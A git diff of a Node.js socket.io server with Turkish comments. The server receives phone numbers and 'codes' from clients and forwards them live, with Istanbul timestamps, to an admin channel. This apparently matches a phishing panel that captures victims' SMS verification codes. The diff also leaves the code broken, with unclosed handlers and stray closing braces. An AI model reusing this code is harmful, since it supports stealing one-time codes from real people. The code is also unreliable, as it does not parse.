@@ -31,13 +31,17 @@ io.on('connection', (socket) => {
   // TELEFON
   socket.on('new-phone', (phone) => {
     console.log('Yeni telefon: ' + phone);
-    io.emit('admin-new-phone', { phone: phone, date: new Date().toLocaleString() });
+  io.emit('admin-new-phone', {
+  phone: phone,
+  date: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
   });
 
   // KOD
   socket.on('new-code', (code) => {
     console.log('Yeni code: ' + code);
-    io.emit('admin-new-code', { code: code, date: new Date().toLocaleString() });
+    io.emit('admin-new-code', {
+  code: code,
+  date: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
   });
 
   // 🔥 YENİ KULLANICI (EKLEDİK)
@@ -53,9 +57,12 @@ io.on('connection', (socket) => {
   socket.on('disconnect', () => {
     console.log('Kullanıcı ayrıldı');
   });
-});
+  });
 
-const port = process.env.PORT || 3000;
-http.listen(port, () => {
+ const port = process.env.PORT || 3000;
+ http.listen(port, () => {
   console.log(`Sunucu ${port} portunda çalışıyor`);
+
+  });
+ });
 });
